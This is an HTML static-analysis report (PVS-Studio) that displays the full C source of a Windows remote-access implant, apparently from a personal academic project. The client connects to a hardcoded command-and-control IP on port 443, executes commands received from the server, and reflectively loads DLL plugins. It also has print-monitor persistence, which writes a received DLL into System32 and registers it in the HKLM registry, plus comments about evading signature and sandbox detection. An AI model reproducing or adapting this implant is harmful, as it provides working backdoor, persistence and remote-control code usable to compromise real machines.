
<html>
<head>

  <meta http-equiv="Content-Type" content="text/html; charset=US-ASCII" />
  <title>Client.c</title>

  <link rel="stylesheet" href="../style.css"/>
  <script src="../jquery-3.5.1.min.js"></script>
</head>
<body>

<pre><code class = "cpp">
<a name="ln1">// This is a personal academic project. Dear PVS-Studio, please check it.</a>
<a name="ln2"> </a>
<a name="ln3">// PVS-Studio Static Code Analyzer for C, C++, C#, and Java: http://www.viva64.com</a>
<a name="ln4"> </a>
<a name="ln5">#include &quot;Client.h&quot;</a>
<a name="ln6"> </a>
<a name="ln7">static struct PLUGIN_COMMANDS ppc_struct = { 0 };</a>
<a name="ln8"> </a>
<a name="ln9">BOOL IsElevated() </a>
<a name="ln10">{</a>
<a name="ln11">	TOKEN_ELEVATION Elevation = { 0 };</a>
<a name="ln12">	DWORD cbSize = sizeof(TOKEN_ELEVATION);</a>
<a name="ln13">	BOOL fRet = FALSE;</a>
<a name="ln14">	HANDLE hToken = NULL;</a>
<a name="ln15"> </a>
<a name="ln16">	if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &amp;hToken)) </a>
<a name="ln17">	{</a>
<a name="ln18">		if (GetTokenInformation(hToken, TokenElevation, &amp;Elevation, sizeof(Elevation), &amp;cbSize)) </a>
<a name="ln19">		{</a>
<a name="ln20">			fRet = Elevation.TokenIsElevated;</a>
<a name="ln21">		}</a>
<a name="ln22">	}</a>
<a name="ln23">	if (hToken) </a>
<a name="ln24">	{</a>
<a name="ln25">		CloseHandle(hToken);</a>
<a name="ln26">	}</a>
<a name="ln27">	return fRet;</a>
<a name="ln28">}</a>
<a name="ln29"> </a>
<a name="ln30">void HandleAddMonitor(LPVOID params)</a>
<a name="ln31">{</a>
<a name="ln32">	struct MONITOR_PARAMS *struct_params = (struct MONITOR_PARAMS*)params;</a>
<a name="ln33">	AddMonitor(struct_params-&gt;pName, struct_params-&gt;Level, struct_params-&gt;pMonitors);</a>
<a name="ln34">}</a>
<a name="ln35"> </a>
<a name="ln36">BOOL MonitorPersistence(SOCKET client)</a>
<a name="ln37">{</a>
<a name="ln38">	MONITOR_INFO_2 monitorInfo = { 0 };</a>
<a name="ln39">	DWORD dwLength = NULL;</a>
<a name="ln40">	int iResult = NULL;</a>
<a name="ln41">	HKEY hKey;</a>
<a name="ln42">	TCHAR tcEnvironment[128];</a>
<a name="ln43">	TCHAR tcMonitorName[128];</a>
<a name="ln44">	TCHAR tcDllName[128];</a>
<a name="ln45">	HYPERFILE hfFile = NULL;</a>
<a name="ln46">	unsigned long stFileSize = 0;</a>
<a name="ln47">	const char* dllname = NULL;</a>
<a name="ln48"> </a>
<a name="ln49">	dllname = &quot;C:\\WINDOWS\\System32\\WinProc64.dll&quot;;</a>
<a name="ln50">	send(client, &quot;OK&quot;, 3, 0);</a>
<a name="ln51">	Sleep(50);</a>
<a name="ln52"> </a>
<a name="ln53">	if (HyperReceiveFile(client, &amp;hfFile, &amp;stFileSize) != HYPER_SUCCESS)</a>
<a name="ln54">		return FALSE;</a>
<a name="ln55">	if (HyperWriteFile(dllname, hfFile, stFileSize) != HYPER_SUCCESS)</a>
<a name="ln56">		return FALSE;</a>
<a name="ln57"> </a>
<a name="ln58">	iResult = RegCreateKeyExA(</a>
<a name="ln59">		HKEY_LOCAL_MACHINE, </a>
<a name="ln60">		&quot;system\\currentcontrolset\\control\\print\\monitors\\WinProc64&quot;, </a>
<a name="ln61">		NULL, </a>
<a name="ln62">		(LPSTR)&quot;&quot;, </a>
<a name="ln63">		REG_OPTION_NON_VOLATILE, </a>
<a name="ln64">		KEY_ALL_ACCESS, </a>
<a name="ln65">		NULL, </a>
<a name="ln66">		&amp;hKey, </a>
<a name="ln67">		NULL</a>
<a name="ln68">	);</a>
<a name="ln69">	if (iResult &lt; 0)</a>
<a name="ln70">		return NULL;</a>
<a name="ln71">	</a>
<a name="ln72">	iResult = RegSetValueExA(</a>
<a name="ln73">		hKey, </a>
<a name="ln74">		&quot;Driver&quot;, </a>
<a name="ln75">		NULL, </a>
<a name="ln76">		REG_SZ, </a>
<a name="ln77">		(BYTE *)dllname, </a>
<a name="ln78">		sizeof(dllname)</a>
<a name="ln79">	);</a>
<a name="ln80">	if (iResult &lt; 0)</a>
<a name="ln81">		return FALSE;</a>
<a name="ln82"> </a>
<a name="ln83">	wcscpy_s(tcEnvironment, 128, L&quot;Windows x64&quot;);</a>
<a name="ln84">	wcscpy_s(tcMonitorName, 128, L&quot;WinProc64&quot;);</a>
<a name="ln85">	wcscpy_s(tcDllName, 128, L&quot;WinProc64.dll&quot;);</a>
<a name="ln86">	</a>
<a name="ln87">	monitorInfo.pName = tcEnvironment;</a>
<a name="ln88">	monitorInfo.pEnvironment = tcMonitorName;</a>
<a name="ln89">	monitorInfo.pDLLName = tcDllName;</a>
<a name="ln90">	</a>
<a name="ln91">	struct MONITOR_PARAMS params = {</a>
<a name="ln92">		NULL,</a>
<a name="ln93">		2,</a>
<a name="ln94">		(LPBYTE)&amp;monitorInfo</a>
<a name="ln95">	};</a>
<a name="ln96"> </a>
<a name="ln97">	HANDLE hThread = CreateThread(</a>
<a name="ln98">		NULL, </a>
<a name="ln99">		0,</a>
<a name="ln100">		(LPTHREAD_START_ROUTINE)HandleAddMonitor,</a>
<a name="ln101">		&amp;params, </a>
<a name="ln102">		0, </a>
<a name="ln103">		NULL</a>
<a name="ln104">	);</a>
<a name="ln105"> </a>
<a name="ln106">	Sleep(2000);</a>
<a name="ln107"> </a>
<a name="ln108">	// Exit because we don't want 2 different clients with 2 different privileges on the same machine.</a>
<a name="ln109">	shutdown(client, SD_BOTH);</a>
<a name="ln110">	closesocket(client);</a>
<a name="ln111">	WSACleanup();</a>
<a name="ln112">	exit(0);</a>
<a name="ln113"> </a>
<a name="ln114">	return FALSE;</a>
<a name="ln115">}</a>
<a name="ln116"> </a>
<a name="ln117">// Executes command given to client from C2 Server</a>
<a name="ln118">void ExecuteCommand(SOCKET client, char* command, struct PLUGIN_COMMANDS *ppc)</a>
<a name="ln119">{</a>
<a name="ln120">	if (command == NULL)</a>
<a name="ln121">		return;</a>
<a name="ln122">	</a>
<a name="ln123">	size_t argc = 0;</a>
<a name="ln124">	char** argv = GetArgs(command, ' ', &amp;argc);</a>
<a name="ln125">	if (argv == NULL || argv[0] == NULL)</a>
<a name="ln126">		return;</a>
<a name="ln127"> </a>
<a name="ln128">	printf(&quot;arg0: %s\nargv size: %llu\n&quot;, argv[0], argc);</a>
<a name="ln129"> </a>
<a name="ln130">	for (int i = 0; i &lt; ppc-&gt;commandListSize; i++)</a>
<a name="ln131">	{</a>
<a name="ln132">		printf(&quot;%s\n&quot;, ppc-&gt;commandList[i].name);</a>
<a name="ln133">		if (strcmp(ppc-&gt;commandList[i].name, argv[0]) == 0)</a>
<a name="ln134">		{</a>
<a name="ln135">			ppc-&gt;commandList[i].execute(argv, argc, client);</a>
<a name="ln136">			free(argv);</a>
<a name="ln137">			return;</a>
<a name="ln138">		}</a>
<a name="ln139">	}</a>
<a name="ln140"> </a>
<a name="ln141">	printf(&quot;[-] Command %s not found\n&quot;, argv[0]);</a>
<a name="ln142">}</a>
<a name="ln143"> </a>
<a name="ln144">void</a>
<a name="ln145">test1(</a>
<a name="ln146">	char** argv,</a>
<a name="ln147">	size_t argc,</a>
<a name="ln148">	SOCKET sock)</a>
<a name="ln149">{</a>
<a name="ln150">	printf(&quot;test1\n&quot;);</a>
<a name="ln151">}</a>
<a name="ln152"> </a>
<a name="ln153">void</a>
<a name="ln154">test2(</a>
<a name="ln155">	char** argv,</a>
<a name="ln156">	size_t argc,</a>
<a name="ln157">	SOCKET sock)</a>
<a name="ln158">{</a>
<a name="ln159">	printf(&quot;test2\n&quot;);</a>
<a name="ln160">}</a>
<a name="ln161"> </a>
<a name="ln162">void</a>
<a name="ln163">load(</a>
<a name="ln164">	char** argv,</a>
<a name="ln165">	size_t argc,</a>
<a name="ln166">	SOCKET sock)</a>
<a name="ln167">{</a>
<a name="ln168">	if (argc &lt; 2)</a>
<a name="ln169">		return;</a>
<a name="ln170">	</a>
<a name="ln171">	// Check if plugin is already loaded</a>
<a name="ln172">	for (int i = 0; i &lt; ppc_struct.moduleNamesSize; i++)</a>
<a name="ln173">	{</a>
<a name="ln174">		if (strcmp(ppc_struct.moduleNames[i], argv[1]) == 0)</a>
<a name="ln175">		{</a>
<a name="ln176">			printf(&quot;%s already exists.\n&quot;, argv[1]);</a>
<a name="ln177">			send(sock, &quot;EXISTS&quot;, 7, NULL);</a>
<a name="ln178">			Sleep(50);</a>
<a name="ln179">			return;</a>
<a name="ln180">		}</a>
<a name="ln181">	}</a>
<a name="ln182"> </a>
<a name="ln183">	puts(&quot;sending&quot;);</a>
<a name="ln184">	//send(sock, &quot;SEND&quot;, 5, NULL);</a>
<a name="ln185">	Sleep(50);</a>
<a name="ln186"> </a>
<a name="ln187">	HANDLE hModule = LoadPlugin(sock, &amp;ppc_struct);</a>
<a name="ln188">	if (hModule == FALSE)</a>
<a name="ln189">	{</a>
<a name="ln190">		printf(&quot;%s initialize() failed!\n&quot;, argv[1]);</a>
<a name="ln191">		return;</a>
<a name="ln192">	}</a>
<a name="ln193"> </a>
<a name="ln194">	puts(&quot;Pushing Back...\n&quot;);</a>
<a name="ln195">	ppc_struct.moduleNames[ppc_struct.moduleNamesSize++] = _strdup(argv[1]);</a>
<a name="ln196">}</a>
<a name="ln197"> </a>
<a name="ln198">void</a>
<a name="ln199">CloseClient(</a>
<a name="ln200">	char** argv,</a>
<a name="ln201">	size_t argc,</a>
<a name="ln202">	SOCKET sock)</a>
<a name="ln203">{</a>
<a name="ln204">	shutdown(sock, SD_BOTH);</a>
<a name="ln205">	closesocket(sock);</a>
<a name="ln206">	WSACleanup();</a>
<a name="ln207">	exit(0);</a>
<a name="ln208">}</a>
<a name="ln209"> </a>
<a name="ln210">void </a>
<a name="ln211">PluginCommandInit(</a>
<a name="ln212">	struct PLUGIN_COMMANDS *ppc)</a>
<a name="ln213">{</a>
<a name="ln214">	// Assign commands</a>
<a name="ln215">	const int numOfCommands = 4;</a>
<a name="ln216">	ppc-&gt;commandList[0].name = &quot;test1&quot;;</a>
<a name="ln217">	ppc-&gt;commandList[0].help = &quot;Prints \&quot;test1\&quot; to screen&quot;;</a>
<a name="ln218">	ppc-&gt;commandList[0].execute = test1;</a>
<a name="ln219"> </a>
<a name="ln220">	ppc-&gt;commandList[1].name = &quot;test2&quot;;</a>
<a name="ln221">	ppc-&gt;commandList[1].help = &quot;Prints \&quot;test2\&quot; to screen&quot;;</a>
<a name="ln222">	ppc-&gt;commandList[1].execute = test2;</a>
<a name="ln223"> </a>
<a name="ln224">	ppc-&gt;commandList[2].name = &quot;close&quot;;</a>
<a name="ln225">	ppc-&gt;commandList[2].help = &quot;Closes the client&quot;;</a>
<a name="ln226">	ppc-&gt;commandList[2].execute = CloseClient;</a>
<a name="ln227"> </a>
<a name="ln228">	ppc-&gt;commandList[3].name = &quot;load&quot;;</a>
<a name="ln229">	ppc-&gt;commandList[3].help = &quot;Reflectively loads a DLL plugin&quot;;</a>
<a name="ln230">	ppc-&gt;commandList[3].execute = load;</a>
<a name="ln231"> </a>
<a name="ln232">	ppc-&gt;commandListSize = numOfCommands;</a>
<a name="ln233"> </a>
<a name="ln234">	// Assign module names</a>
<a name="ln235">	ppc-&gt;moduleNamesSize = 1;</a>
<a name="ln236">	ppc-&gt;moduleNames[0] = &quot;base&quot;;</a>
<a name="ln237"> </a>
<a name="ln238">}</a>
<a name="ln239"> </a>
<a name="ln240">#ifdef _WINDLL</a>
<a name="ln241">__declspec(dllexport) int mainFunc() </a>
<a name="ln242">{</a>
<a name="ln243">#else</a>
<a name="ln244">int main(void)</a>
<a name="ln245">{</a>
<a name="ln246">#endif</a>
<a name="ln247">	int iResult = 0;</a>
<a name="ln248"> </a>
<a name="ln249">	// Print time and date to evade signature detection</a>
<a name="ln250">	printf(&quot;%s %s\n&quot;, __TIME__, __DATE__);</a>
<a name="ln251"> </a>
<a name="ln252">	// Evade sandbox/VM</a>
<a name="ln253">	const char* badDlls[1];</a>
<a name="ln254">	badDlls[0] = &quot;SbieDll.dll&quot;;</a>
<a name="ln255">	//if (CheckSandbox(badDlls, 1))</a>
<a name="ln256">		//exit(0);</a>
<a name="ln257"> </a>
<a name="ln258">	PluginCommandInit(&amp;ppc_struct);</a>
<a name="ln259"> </a>
<a name="ln260">	while (TRUE) </a>
<a name="ln261">	{</a>
<a name="ln262">		Sleep(2500);</a>
<a name="ln263">		char inputBuf[MAX_INPUT_BUFFER];</a>
<a name="ln264">		char C2ip[] = &quot;136.53.57.189&quot;;</a>
<a name="ln265">		unsigned short port = 443;</a>
<a name="ln266"> </a>
<a name="ln267">		SOCKET client = ConnectServer(C2ip, port);</a>
<a name="ln268">		if (client == NULL)</a>
<a name="ln269">			continue;</a>
<a name="ln270"> </a>
<a name="ln271">#ifndef _WINDLL</a>
<a name="ln272">		/*if (IsElevated()) </a>
<a name="ln273">		{</a>
<a name="ln274">			send(client, &quot;persist&quot;, 8, 0);</a>
<a name="ln275">			Sleep(50);</a>
<a name="ln276">			MonitorPersistence(client);</a>
<a name="ln277">		}*/</a>
<a name="ln278">#endif</a>
<a name="ln279">		send(client, &quot;OK&quot;, 3, 0);</a>
<a name="ln280">		while (TRUE) </a>
<a name="ln281">		{</a>
<a name="ln282">			memset(inputBuf, 0, sizeof(inputBuf));</a>
<a name="ln283">			iResult = recv(client, inputBuf, sizeof(inputBuf), 0);</a>
<a name="ln284">			if (iResult != SOCKET_ERROR &amp;&amp; iResult != CONNECTION_CLOSED) </a>
<a name="ln285">			{</a>
<a name="ln286">				ExecuteCommand(client, inputBuf, &amp;ppc_struct);</a>
<a name="ln287">				printf(&quot;Command executed sucessfully.\n&quot;);</a>
<a name="ln288">			}</a>
<a name="ln289">			else </a>
<a name="ln290">			{</a>
<a name="ln291">				printf(&quot;Goin again\n&quot;);</a>
<a name="ln292">				closesocket(client);</a>
<a name="ln293">				WSACleanup();</a>
<a name="ln294">				break;</a>
<a name="ln295">			}</a>
<a name="ln296">		}</a>
<a name="ln297"> </a>
<a name="ln298">		//closesocket(client);</a>
<a name="ln299">		//WSACleanup();</a>
<a name="ln300">	}</a>
<a name="ln301"> </a>
<a name="ln302">	return 0;</a>
<a name="ln303">}</a>
<a name="ln304"> </a>
<a name="ln305">#ifdef _WINDLL</a>
<a name="ln306">DLLAPI BOOL APIENTRY DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)</a>
<a name="ln307">{</a>
<a name="ln308">	switch (fdwReason)</a>
<a name="ln309">	{</a>
<a name="ln310">	case DLL_PROCESS_ATTACH:</a>
<a name="ln311">		// attach to process</a>
<a name="ln312">		// return FALSE to fail DLL load</a>
<a name="ln313">		mainFunc();</a>
<a name="ln314">		break;</a>
<a name="ln315"> </a>
<a name="ln316">	case DLL_PROCESS_DETACH:</a>
<a name="ln317">		// detach from process</a>
<a name="ln318">		break;</a>
<a name="ln319"> </a>
<a name="ln320">	case DLL_THREAD_ATTACH:</a>
<a name="ln321">		// attach to thread</a>
<a name="ln322">		break;</a>
<a name="ln323"> </a>
<a name="ln324">	case DLL_THREAD_DETACH:</a>
<a name="ln325">		// detach from thread</a>
<a name="ln326">		break;</a>
<a name="ln327">	}</a>
<a name="ln328">	return TRUE; // succesful</a>
<a name="ln329">}</a>
<a name="ln330">#endif</a>

</code></pre>
<div class="balloon" rel="58"><p><span style="font-size:18px">&uarr;</span> <a href="https://www.viva64.com/en/w/v107/" target="_blank">V107</a> Implicit type conversion third argument 'NULL' of function 'RegCreateKeyExA' to 32-bit type.</p></div>
<div class="balloon" rel="130"><p><span style="font-size:18px">&uarr;</span> <a href="https://www.viva64.com/en/w/v104/" target="_blank">V104</a> Implicit conversion of 'i' to memsize type in an arithmetic expression: i < ppc->commandListSize</p></div>
<div class="balloon" rel="172"><p><span style="font-size:18px">&uarr;</span> <a href="https://www.viva64.com/en/w/v104/" target="_blank">V104</a> Implicit conversion of 'i' to memsize type in an arithmetic expression: i < ppc_struct.moduleNamesSize</p></div>
<div class="balloon" rel="177"><p><span style="font-size:18px">&uarr;</span> <a href="https://www.viva64.com/en/w/v107/" target="_blank">V107</a> Implicit type conversion fourth argument 'NULL' of function 'send' to 32-bit type.</p></div>
<div class="balloon" rel="70"><p><span style="font-size:18px">&uarr;</span> <a href="https://www.viva64.com/en/w/v110/" target="_blank">V110</a> Implicit type conversion of return value 'NULL' from memsize type to 32-bit type.</p></div>
<div class="balloon" rel="55"><p><span style="font-size:18px">&uarr;</span> <a href="https://www.viva64.com/en/w/v106/" target="_blank">V106</a> Implicit type conversion third argument 'stFileSize' of function 'HyperWriteFile' to memsize type.</p></div>
<div class="balloon" rel="72"><p><span style="font-size:18px">&uarr;</span> <a href="https://www.viva64.com/en/w/v107/" target="_blank">V107</a> Implicit type conversion third argument 'NULL' of function 'RegSetValueExA' to 32-bit type.</p></div>
<div class="balloon" rel="40"><p><span style="font-size:18px">&uarr;</span> <a href="https://www.viva64.com/en/w/v103/" target="_blank">V103</a> Implicit type conversion from memsize to 32-bit type.</p></div>
<div class="balloon" rel="39"><p><span style="font-size:18px">&uarr;</span> <a href="https://www.viva64.com/en/w/v103/" target="_blank">V103</a> Implicit type conversion from memsize to 32-bit type.</p></div>
<div class="balloon" rel="70"><p><span style="font-size:18px">&uarr;</span> <a href="https://www.viva64.com/en/w/v724/" target="_blank">V724</a> Converting type 'void *' to type 'BOOL' can lead to a loss of high-order bits. Non-zero value can become 'FALSE'.</p></div>
<div class="balloon" rel="72"><p><span style="font-size:18px">&uarr;</span> <a href="https://www.viva64.com/en/w/v601/" target="_blank">V601</a> Pointer is implicitly cast to an integer type. Inspect the third argument.</p></div>
<div class="balloon" rel="39"><p><span style="font-size:18px">&uarr;</span> <a href="https://www.viva64.com/en/w/v601/" target="_blank">V601</a> Pointer is implicitly cast to an integer type.</p></div>
<div class="balloon" rel="40"><p><span style="font-size:18px">&uarr;</span> <a href="https://www.viva64.com/en/w/v601/" target="_blank">V601</a> Pointer is implicitly cast to an integer type.</p></div>
<div class="balloon" rel="58"><p><span style="font-size:18px">&uarr;</span> <a href="https://www.viva64.com/en/w/v601/" target="_blank">V601</a> Pointer is implicitly cast to an integer type. Inspect the third argument.</p></div>
<div class="balloon" rel="70"><p><span style="font-size:18px">&uarr;</span> <a href="https://www.viva64.com/en/w/v601/" target="_blank">V601</a> Pointer is implicitly cast to an integer type.</p></div>
<div class="balloon" rel="177"><p><span style="font-size:18px">&uarr;</span> <a href="https://www.viva64.com/en/w/v601/" target="_blank">V601</a> Pointer is implicitly cast to an integer type. Inspect the fourth argument.</p></div>
<div class="balloon" rel="97"><p><span style="font-size:18px">&uarr;</span> <a href="https://www.viva64.com/en/w/v513/" target="_blank">V513</a> Use _beginthreadex/_endthreadex functions instead of CreateThread/ExitThread functions.</p></div>

<link rel="stylesheet" href="highlight.css">
<script src="highlight.pack.js"></script>
<script src="highlightjs-line-numbers.js"></script>
<script>hljs.initHighlightingOnLoad();</script>
<script>hljs.initLineNumbersOnLoad();</script>
<script>
  $(document).ready(function() {
      $('.balloon').each(function () {
          var bl = $(this);
          var line = bl.attr('rel');
          var text = $('a[name="ln'+line+'"]').text();

          var space_count = 0;
          for(var i = 0; i<text.length; i++){
              var char = text[i];
              if((char !== ' ')&&(char !== '\t'))break;
              if(char === '\t')space_count++;
              space_count++;
          }

          bl.css('margin-left', space_count*8);
          $('a[name="ln'+line+'"]').after(bl);
      });

      window.location = window.location;
  });
</script>
</body>
</html>
